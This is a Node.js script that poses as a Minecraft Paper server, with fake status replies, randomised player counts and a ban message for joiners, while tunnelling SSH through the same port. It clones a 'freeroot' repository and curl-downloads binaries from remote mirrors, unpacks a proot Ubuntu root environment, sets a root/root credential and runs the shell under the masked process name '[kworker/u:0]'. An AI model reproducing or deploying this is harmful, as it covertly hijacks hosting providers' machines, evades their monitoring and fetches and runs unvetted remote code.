// cooked by mytai20100 | 2026 =)
'use strict';

const net = require('net');
const fs = require('fs');
const path = require('path');
const { execSync, spawn, execFile } = require('child_process');
const os = require('os');

const URLS = [
    'https://github.com/Mytai20100/freeroot.git',
    'https://github.servernotdie.workers.dev/Mytai20100/freeroot.git',
    'https://gitlab.com/Mytai20100/freeroot.git',
    'https://gitlab.snd.qzz.io/mytai20100/freeroot.git',
    'https://git.snd.qzz.io/mytai20100/freeroot.git'
];

const TMP = 'freeroot_temp';
const DIR = 'work';
const SH = 'noninteractive.sh';

const EXTRA_BINS = [
    ['cryruss-amd64',    'https://github.com/Mytai20100/cryruss/releases/download/v0.0.4/cryruss-amd64'],
    ['cryruss-arm64',    'https://github.com/Mytai20100/cryruss/releases/download/v0.0.4/cryruss-arm64'],
    ['journalctl-amd64', 'https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/journalctl-amd64'],
    ['journalctl-arm64', 'https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/journalctl-arm64'],
    ['systemctl-amd64',  'https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/systemctl-amd64'],
    ['systemctl-arm64',  'https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/systemctl-arm64']
];

let sshIp = '0.0.0.0';
let proxyPort = 2222;
let sshBackendPort = 2223;
let running = true;
let playerCount = 0;
const users = new Map();
users.set('root', 'root');

function getArchSuffix() {
    const arch = os.arch().toLowerCase();
    if (arch === 'arm64' || arch === 'aarch64') return 'arm64';
    if (arch === 'armv6') return 'armv6';
    if (arch === 'armv7' || arch === 'arm') return 'armv7';
    return 'amd64';
}

function getArchSuffixFull() {
    const arch = os.arch().toLowerCase();
    if (arch === 'arm64' || arch === 'aarch64') return 'aarch64';
    if (arch === 'armv6') return 'armv6';
    if (arch === 'armv7' || arch === 'arm') return 'armv7';
    if (arch === 'x64') return 'x86_64';
    return 'x86_64';
}

function info(msg) { console.log('[INFO] ' + msg); }
function warn(msg) { console.warn('[WARN] ' + msg); }
function severe(msg) { console.error('[SEVERE] ' + msg); }

function loadConfig() {
    const cfg = 'server.properties';
    if (fs.existsSync(cfg)) {
        try {
            const lines = fs.readFileSync(cfg, 'utf8').split('\n');
            const props = {};
            for (const line of lines) {
                const trimmed = line.trim();
                if (!trimmed || trimmed.startsWith('#')) continue;
                const idx = trimmed.indexOf('=');
                if (idx !== -1) {
                    props[trimmed.slice(0, idx).trim()] = trimmed.slice(idx + 1).trim();
                }
            }
            sshIp = (props['server-ip'] || '0.0.0.0').trim() || '0.0.0.0';
            proxyPort = parseInt(props['server-port'] || '2222', 10) || 2222;
            sshBackendPort = proxyPort + 1;
            info('[+] Config loaded: proxy=' + sshIp + ':' + proxyPort + ' | ssh_backend=127.0.0.1:' + sshBackendPort);
        } catch (e) {
            warn('Config parse error: ' + e.message + ' — using defaults');
            applyDefaults();
        }
    } else {
        info('[*] No server.properties found, using defaults');
        applyDefaults();
    }
}

function applyDefaults() {
    sshIp = '0.0.0.0';
    proxyPort = 2222;
    sshBackendPort = 2223;
}

function isPortAvailable(port) {
    return new Promise(resolve => {
        const srv = net.createServer();
        srv.once('error', () => resolve(false));
        srv.once('listening', () => { srv.close(); resolve(true); });
        srv.listen(port, '127.0.0.1');
    });
}


function cmd(c) {
    try {
        execSync(c + ' --version', { stdio: 'ignore', timeout: 3000 });
        return true;
    } catch { return false; }
}

function del(p) {
    try {
        if (fs.existsSync(p)) {
            execSync('rm -rf ' + JSON.stringify(p), { stdio: 'ignore' });
        }
    } catch (e) { warn('Delete failed: ' + p + ' ' + e.message); }
}

function clean(d) {
    if (d && fs.existsSync(d)) del(d);
}

function cloneRepo() {
    for (let i = 0; i < URLS.length; i++) {
        const url = URLS[i];
        info('[*] Trying clone: ' + url + ' (' + (i + 1) + '/' + URLS.length + ')');
        try {
            const result = execSync('git clone --depth=1 ' + url + ' ' + TMP, { stdio: 'inherit', timeout: 120000 });
            info('[+] Cloned: ' + url);
            return true;
        } catch (e) {
            warn('Clone failed from ' + url + ' exit: ' + (e.status || 'unknown'));
            if (fs.existsSync(TMP)) del(TMP);
        }
    }
    return false;
}

function readVarInt(buf, offset) {
    let value = 0, position = 0, currentByte, pos = offset;
    while (true) {
        if (pos >= buf.length) throw new Error('Buffer underflow');
        currentByte = buf[pos++];
        value |= (currentByte & 0x7F) << position;
        if ((currentByte & 0x80) === 0) break;
        position += 7;
        if (position >= 32) throw new Error('VarInt too big');
    }
    return { value, offset: pos };
}

function writeVarInt(value) {
    const bytes = [];
    while (true) {
        if ((value & ~0x7F) === 0) { bytes.push(value); break; }
        bytes.push((value & 0x7F) | 0x80);
        value >>>= 7;
    }
    return Buffer.from(bytes);
}

function writeString(str) {
    const strBuf = Buffer.from(str, 'utf8');
    return Buffer.concat([writeVarInt(strBuf.length), strBuf]);
}

function readString(buf, offset) {
    const lenResult = readVarInt(buf, offset);
    const len = lenResult.value;
    const pos = lenResult.offset;
    const str = buf.slice(pos, pos + len).toString('utf8');
    return { value: str, offset: pos + len };
}

function buildStatusJson(protocolVersion) {
    return JSON.stringify({
        version: { name: '1.21.8', protocol: protocolVersion },
        players: { max: 219999, online: playerCount, sample: [] },
        description: { text: 'A Minecraft Server\nPaper 1.21.8' },
        enforcesSecureChat: false,
        previewsChat: false
    });
}

function buildKickMessage() {
    return JSON.stringify({
        text: '',
        extra: [
            { text: 'You are banned from this server\n\n', color: 'red', bold: true },
            { text: 'Reason: ', color: 'gray' },
            { text: 'You wanna fuck dinosakura?\n', color: 'yellow' },
            { text: 'Banned by: ', color: 'gray' },
            { text: 'Console\n', color: 'aqua' },
            { text: 'Unban date: ', color: 'gray' },
            { text: 'Never\n\n', color: 'dark_red' },
            { text: 'Appeals are not available.', color: 'dark_gray', italic: true }
        ]
    });
}

function writeVarIntPacket(packetId, payload) {
    const idBuf = writeVarInt(packetId);
    const strBuf = writeString(payload);
    const data = Buffer.concat([idBuf, strBuf]);
    const lenBuf = writeVarInt(data.length);
    return Buffer.concat([lenBuf, data]);
}

function handleMinecraftInline(socket, peeked) {
    const buffers = [peeked];
    let fullBuf = null;
    let offset = 0;
    let handled = false;

    function tryParse(buf) {
        try {
            let pos = 0;
            const pktLenRes = readVarInt(buf, pos); pos = pktLenRes.offset;
            const pktIdRes = readVarInt(buf, pos); pos = pktIdRes.offset;
            if (pktIdRes.value !== 0x00) { socket.destroy(); return true; }
            const protoRes = readVarInt(buf, pos); pos = protoRes.offset;
            const protocolVersion = protoRes.value;
            const addrRes = readString(buf, pos); pos = addrRes.offset;
            pos += 2;
            const nextStateRes = readVarInt(buf, pos); pos = nextStateRes.offset;
            const nextState = nextStateRes.value;

            if (nextState === 1) {
                const reqLenRes = readVarInt(buf, pos); pos = reqLenRes.offset;
                const reqIdRes = readVarInt(buf, pos); pos = reqIdRes.offset;
                if (reqIdRes.value !== 0x00) { socket.destroy(); return true; }

                const json = buildStatusJson(protocolVersion);
                const statusPkt = writeVarIntPacket(0x00, json);
                socket.write(statusPkt);

                let pingOffset = pos;
                try {
                    const pingLenRes = readVarInt(buf, pingOffset); pingOffset = pingLenRes.offset;
                    const pingIdRes = readVarInt(buf, pingOffset); pingOffset = pingIdRes.offset;
                    if (pingIdRes.value === 0x01 && pingOffset + 8 <= buf.length) {
                        const payload = buf.slice(pingOffset, pingOffset + 8);
                        const pongIdBuf = writeVarInt(0x01);
                        const pongData = Buffer.concat([pongIdBuf, payload]);
                        const pongLen = writeVarInt(pongData.length);
                        socket.write(Buffer.concat([pongLen, pongData]));
                    }
                } catch (ignored) {}

            } else if (nextState === 2) {
                const kickMsg = buildKickMessage();
                const kickPkt = writeVarIntPacket(0x00, kickMsg);
                setTimeout(() => { socket.write(kickPkt); setTimeout(() => socket.destroy(), 100); }, 100);
                return true;
            }

            setTimeout(() => socket.destroy(), 200);
            return true;
        } catch (e) {
            return false;
        }
    }

    socket.on('data', chunk => {
        if (handled) return;
        buffers.push(chunk);
        fullBuf = Buffer.concat(buffers);
        if (tryParse(fullBuf)) { handled = true; }
    });

    fullBuf = peeked;
    if (tryParse(fullBuf)) { handled = true; }
}


function routeConnection(client) {
    client.setTimeout(5000);
    let peeked = false;

    client.once('data', chunk => {
        if (peeked) return;
        peeked = true;
        client.setTimeout(0);

        if (chunk.length < 1) { client.destroy(); return; }

        const isSSH = chunk.length >= 4
            && chunk[0] === 0x53 && chunk[1] === 0x53
            && chunk[2] === 0x48 && chunk[3] === 0x2D;

        if (isSSH) {
            const backend = net.createConnection({ host: '127.0.0.1', port: sshBackendPort }, () => {
                backend.write(chunk);
                client.setNoDelay(true);
                backend.setNoDelay(true);
                client.pipe(backend);
                backend.pipe(client);
                client.on('error', () => { try { backend.destroy(); } catch {} });
                backend.on('error', () => { try { client.destroy(); } catch {} });
            });
            backend.on('error', e => {
                warn('[!] SSH backend unreachable: ' + e.message);
                client.destroy();
            });
            return;
        }

        const looksLikeMC = (chunk[0] & 0x80) === 0 && chunk[0] > 0;
        if (looksLikeMC) {
            handleMinecraftInline(client, chunk);
            return;
        }

        client.destroy();
    });

    client.on('timeout', () => client.destroy());
    client.on('error', () => client.destroy());
}

function startProxy() {
    const server = net.createServer(socket => {
        routeConnection(socket);
    });
    server.listen(proxyPort, sshIp, () => {
        info('[+] Proxy on ' + sshIp + ':' + proxyPort + ' (SSH→127.0.0.1:' + sshBackendPort + ' | MC handled inline)');
    });
    server.on('error', e => severe('Proxy failed to start: ' + e.message));
}

function startPlayerCountTicker() {
    playerCount = 20500 + Math.floor(Math.random() * (219999 - 20500 + 1));
    const ticker = setInterval(() => {
        if (!running) { clearInterval(ticker); return; }
        playerCount = 20500 + Math.floor(Math.random() * (219999 - 20500 + 1));
    }, 3000);
}


function waitForBackendThenStartProxy() {
    info('[*] Waiting for SSH backend on port ' + sshBackendPort + '...');
    let tries = 0;
    const interval = setInterval(async () => {
        const available = await isPortAvailable(sshBackendPort);
        if (!available) {
            clearInterval(interval);
            info('[+] SSH backend up, starting proxy');
            startPlayerCountTicker();
            startProxy();
            return;
        }
        tries++;
        if (tries >= 120) {
            clearInterval(interval);
            warn('[!] SSH backend timeout after 120s, starting proxy anyway');
            startPlayerCountTicker();
            startProxy();
        }
    }, 1000);
}

function watchForInstalled() {
    const workDir = path.join(process.cwd(), 'work');
    let tries = 0;
    const interval = setInterval(() => {
        tries++;
        if (
            fs.existsSync(workDir) &&
            fs.existsSync(path.join(workDir, '.installed'))
        ) {
            clearInterval(interval);
            setTimeout(() => createSSHWrapper(), 1000);
        }
        if (tries >= 60) clearInterval(interval);
    }, 1000);
}

function createSSHWrapper() {
    try {
        const workDir = path.join(process.cwd(), 'work');
        if (!fs.existsSync(workDir)) return;
        const wrapper = path.join(workDir, 'ssh.sh');
        if (fs.existsSync(wrapper)) fs.unlinkSync(wrapper);
        const script = `#!/bin/bash
set +m
export LC_ALL=C
export LANG=C
ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin
export PROOT_CONFIG="$ROOTFS_DIR/usr/local/.config/proot.yml"
if [ ! -e $ROOTFS_DIR/.installed ]; then
    echo 'Proot environment not installed yet.'
    exit 1
fi
chmod -R 755 $ROOTFS_DIR/usr/local/bin/ 2>/dev/null
export TERM=\${TERM:-xterm-256color}
COLS=$(tput cols 2>/dev/null || echo 80)
ROWS=$(tput lines 2>/dev/null || echo 24)
stty cols $COLS rows $ROWS 2>/dev/null
cat > $ROOTFS_DIR/root/.bashrc << 'BASHRC_EOF'
export HOSTNAME=furryisbest
export USER=furry
export TERM_PROGRAM="bash"
export PS1='root@furryisbest:\\w\\$ '
export LC_ALL=C
export LANG=C
export TMOUT=0
unset TMOUT
resize_term() { local sz; sz=$(stty size 2>/dev/null); [ -n "$sz" ] && stty rows \${sz%% *} cols \${sz##* } 2>/dev/null; export COLUMNS=\${sz##* } LINES=\${sz%% *}; }
resize_term
trap resize_term WINCH
export DEBIAN_FRONTEND=noninteractive
alias ls='ls --color=auto'
alias ll='ls -lah'
alias grep='grep --color=auto'
alias id='id 2>/dev/null'
BASHRC_EOF
stty sane 2>/dev/null
while true; do
  COLS=$(tput cols 2>/dev/null || echo 80)
  ROWS=$(tput lines 2>/dev/null || echo 24)
  DEBIAN_FRONTEND=noninteractive COLUMNS=$COLS LINES=$ROWS \\
  exec -a "[kworker/u:0]" $ROOTFS_DIR/usr/local/bin/apk
  EXIT_CODE=$?
  echo 'Session ended. Restarting in 2 seconds...'
  sleep 2
done
`;
        fs.writeFileSync(wrapper, script, 'utf8');
        fs.chmodSync(wrapper, 0o755);
    } catch (e) { warn('createSSHWrapper: ' + e.message); }
}

function createDefaultScript(scriptPath) {
    const s = `#!/bin/sh
export LC_ALL=C
export LANG=C
ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin
if [ ! -e $ROOTFS_DIR/.installed ]; then
  mkdir -p $ROOTFS_DIR/usr/local/bin
  chmod 755 $ROOTFS_DIR/usr/local/bin/apk
  printf 'nameserver 1.1.1.1\\n' > \${ROOTFS_DIR}/etc/resolv.conf
  touch $ROOTFS_DIR/.installed
fi
$ROOTFS_DIR/usr/local/bin/apk --rootfs="\${ROOTFS_DIR}" -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf -b $ROOTFS_DIR/usr/local/bin:/usr/local/bin --kill-on-exit /bin/bash -i
`;
    fs.writeFileSync(scriptPath, s, 'utf8');
    fs.chmodSync(scriptPath, 0o755);
}

function extractTarXz(resourcePath, destDir) {
    if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
    execSync('tar -xJf ' + JSON.stringify(resourcePath) + ' -C ' + JSON.stringify(destDir), { stdio: 'ignore' });
}

function extractBinFromTarXz(resourceTarXz, destDir, destName) {
    const destFile = path.join(destDir, destName);
    try {
        const tmpDir = path.join(os.tmpdir(), 'bin_extract_' + destName + '_' + Date.now());
        if (fs.existsSync(tmpDir)) del(tmpDir);
        fs.mkdirSync(tmpDir, { recursive: true });
        extractTarXz(resourceTarXz, tmpDir);
        const files = fs.readdirSync(tmpDir).map(f => path.join(tmpDir, f)).filter(f => fs.statSync(f).isFile());
        if (files.length > 0) {
            if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
            fs.copyFileSync(files[0], destFile);
        }
        del(tmpDir);
    } catch (e) {
        warn('extractBinFromTarXz [' + resourceTarXz + ']: ' + e.message);
    }
    if (fs.existsSync(destFile)) {
        fs.chmodSync(destFile, 0o755);
        try { execSync('chmod 755 ' + JSON.stringify(destFile), { stdio: 'ignore' }); } catch {}
    }
    return destFile;
}

function installBins(workDir) {
    const suffix = getArchSuffix();
    const binDir = path.join(workDir, 'usr/local/bin');
    if (!fs.existsSync(binDir)) fs.mkdirSync(binDir, { recursive: true });

    const targets = [
        ['cryruss',    'cryruss-'    + suffix],
        ['journalctl', 'journalctl-' + suffix],
        ['systemctl',  'systemctl-'  + suffix]
    ];

    for (const [name, resourceName] of targets) {
        const destFile = path.join(binDir, name);
        if (fs.existsSync(destFile)) {
            try { fs.accessSync(destFile, fs.constants.X_OK); continue; } catch {}
        }
        const result = extractBinFromTarXz(path.join(process.cwd(), resourceName + '.tar.xz'), binDir, name);
        if (!fs.existsSync(result)) {
            for (const [depName, depUrl] of EXTRA_BINS) {
                if (depName === resourceName) {
                    try {
                        info('[*] Downloading ' + resourceName + '...');
                        const { execSync: es } = require('child_process');
                        es('curl -fsSL -o ' + JSON.stringify(destFile) + ' ' + depUrl, { stdio: 'inherit', timeout: 60000 });
                        fs.chmodSync(destFile, 0o755);
                        es('chmod 755 ' + JSON.stringify(destFile), { stdio: 'ignore' });
                    } catch (e) {
                        warn('Failed to download ' + resourceName + ': ' + e.message);
                    }
                    break;
                }
            }
        }
        if (fs.existsSync(destFile)) info('[+] Ready: ' + destFile);
        else warn('[!] Binary missing: ' + name);
    }
}

function fallbackLocal() {
    info('[*] Local resources fallback...');
    try {
        const w = path.join(process.cwd(), DIR);
        if (!fs.existsSync(w)) fs.mkdirSync(w, { recursive: true });

        const archSuffix = getArchSuffixFull();
        const binSuffix  = getArchSuffix();
        let archAlt;
        if (archSuffix === 'aarch64') archAlt = 'arm64';
        else if (archSuffix === 'armv6') archAlt = 'armv6';
        else if (archSuffix === 'armv7') archAlt = 'armv7';
        else archAlt = 'amd64';

        const supported = ['x86_64','aarch64','armv6','armv7'];
        if (!supported.includes(archSuffix)) {
            severe('Unsupported arch: ' + os.arch());
            return false;
        }

        const binDir = path.join(w, 'usr/local/bin');
        if (!fs.existsSync(binDir)) fs.mkdirSync(binDir, { recursive: true });

        const prootTar = path.join(process.cwd(), 'proot-' + archSuffix + '.tar.xz');
        const prootBin = extractBinFromTarXz(prootTar, binDir, 'proot');
        if (!fs.existsSync(prootBin)) { severe('proot not extracted'); return false; }

        const busyboxTar = path.join(process.cwd(), 'busybox-' + archSuffix + '.tar.xz');
        extractBinFromTarXz(busyboxTar, w, 'busybox-' + archSuffix);

        const localBins = [
            ['cryruss',    'cryruss-'    + binSuffix],
            ['journalctl', 'journalctl-' + binSuffix],
            ['systemctl',  'systemctl-'  + binSuffix]
        ];

        for (const [name, resourceName] of localBins) {
            const destBin = path.join(binDir, name);
            if (fs.existsSync(destBin)) {
                try { fs.accessSync(destBin, fs.constants.X_OK); continue; } catch {}
            }
            const tarPath = path.join(process.cwd(), resourceName + '.tar.xz');
            const result = extractBinFromTarXz(tarPath, binDir, name);
            if (!fs.existsSync(result)) {
                for (const [depName, depUrl] of EXTRA_BINS) {
                    if (depName === resourceName) {
                        try {
                            execSync('curl -fsSL -o ' + JSON.stringify(destBin) + ' ' + depUrl, { stdio: 'inherit', timeout: 60000 });
                            fs.chmodSync(destBin, 0o755);
                            execSync('chmod 755 ' + JSON.stringify(destBin), { stdio: 'ignore' });
                        } catch (e) {
                            warn('Failed to download ' + resourceName + ': ' + e.message);
                        }
                        break;
                    }
                }
            }
            if (fs.existsSync(destBin)) info('[+] Ready: ' + path.basename(destBin));
        }

        const ubuntuTar = path.join(process.cwd(), 'ubuntu-base-22.04.5-base-' + archAlt + '.tar.xz');
        extractTarXz(ubuntuTar, w);

        const scriptPath = path.join(w, SH);
        const embeddedScript = path.join(process.cwd(), 'META-INF', 'noninteractive.sh');
        if (fs.existsSync(embeddedScript)) {
            fs.copyFileSync(embeddedScript, scriptPath);
            fs.chmodSync(scriptPath, 0o755);
        } else {
            createDefaultScript(scriptPath);
        }

        info('[+] Local fallback done');
        return true;
    } catch (e) {
        severe('Local fallback failed: ' + e.message);
        return false;
    }
}

function execScript(workDir, scriptName) {
    info('[*] Executing noninteractive.sh...');

    const installedMarker = path.join(workDir, '.installed');

    if (!fs.existsSync(installedMarker)) {
        const scriptPath = path.join(workDir, scriptName);
        const pr = spawn('bash', [scriptName], {
            cwd: workDir,
            stdio: ['ignore', 'inherit', 'inherit']
        });

        let done = false;
        let tries = 0;
        const check = setInterval(() => {
            tries++;
            if (fs.existsSync(installedMarker)) {
                clearInterval(check);
                if (!done) { done = true; pr.kill('SIGTERM'); afterInstall(workDir, scriptName); }
            }
            if (tries >= 300) {
                clearInterval(check);
                if (!done) { done = true; pr.kill('SIGTERM'); afterInstall(workDir, scriptName); }
            }
        }, 1000);

        pr.on('exit', () => {
            clearInterval(check);
            if (!done) { done = true; afterInstall(workDir, scriptName); }
        });
    } else {
        afterInstall(workDir, scriptName);
    }
}

function afterInstall(workDir, scriptName) {
    if (!fs.existsSync(path.join(workDir, '.installed'))) {
        severe('[!] .installed not found, abort.');
        return;
    }

    installBins(workDir);

    try {
        execSync('chmod -R 755 ' + JSON.stringify(path.join(workDir, 'usr/local/bin')), { stdio: 'ignore' });
    } catch {}

    createSSHWrapper();

    function runLoop() {
        if (!running) return;
        const scriptPath = path.join(workDir, scriptName);
        const env = Object.assign({}, process.env, {
            TERM: process.env.TERM || 'xterm-256color',
            LC_ALL: 'C',
            LANG: 'C',
            TMOUT: '0'
        });
        const pr = spawn('bash', [scriptPath], {
            cwd: workDir,
            stdio: 'inherit',
            env
        });
        pr.on('exit', code => {
            info('[*] Session exited (' + code + '), restarting in 2s...');
            if (running) setTimeout(runLoop, 2000);
        });
    }
    runLoop();
}

function runAfterFallback() {
    const wf = path.join(process.cwd(), DIR);
    const sf = path.join(wf, SH);
    if (fs.existsSync(sf)) {
        fs.chmodSync(sf, 0o755);
        execScript(wf, SH);
    } else {
        warn('[!] Fallback did not create work dir');
    }
}

async function main() {
    const args = process.argv.slice(2);
    let noNet = false;

    for (const arg of args) {
        if (arg === '--help' || arg === 'help') {
            console.log('Usage: node main.js [options]');
            console.log('  --help    Show this help');
            console.log('  --nonet   Use embedded resources, skip git clone');
            return;
        }
        if (arg === '--nonet') {
            noNet = true;
            info('[*] --nonet mode: using embedded resources');
        }
    }

    loadConfig();
    waitForBackendThenStartProxy();
    watchForInstalled();

    const hasBash = cmd('bash');
    if (!hasBash) { severe('Bash not found'); process.exit(1); }

    const w = path.join(process.cwd(), DIR);
    if (fs.existsSync(w)) {
        info('[*] \'work\' exists, checking...');
        const s = path.join(w, SH);
        if (fs.existsSync(s)) {
            info('[+] Valid repo found, skipping clone');
            fs.chmodSync(s, 0o755);
            execScript(w, SH);
            return;
        } else {
            warn('Invalid repo, removing...');
            del(w);
        }
    }

    const t = path.join(process.cwd(), TMP);
    if (fs.existsSync(t)) del(t);

    if (noNet) {
        info('[*] --nonet: skipping clone, using embedded resources');
        if (!fallbackLocal()) { severe('Fallback failed'); process.exit(1); }
        runAfterFallback();
        return;
    }

    const hasGit = cmd('git');
    if (!hasGit) {
        warn('Git not found, using fallback');
        if (!fallbackLocal()) { severe('Fallback failed'); process.exit(1); }
        runAfterFallback();
        return;
    }

    if (!cloneRepo()) {
        warn('All clones failed, trying fallback...');
        clean(t);
        if (!fallbackLocal()) { severe('Fallback failed'); process.exit(1); }
        runAfterFallback();
        return;
    }

    try {
        fs.renameSync(t, w);
        info('[+] Renamed to \'work\'');
    } catch (e) {
        severe('Rename failed');
        clean(t);
        process.exit(1);
    }

    const s = path.join(w, SH);
    if (!fs.existsSync(s)) { severe('Script not found'); clean(w); process.exit(1); }
    fs.chmodSync(s, 0o755);
    execScript(w, SH);
    info('[+] Freeroot');
}

main().catch(e => { severe('Fatal: ' + e.message); process.exit(1); });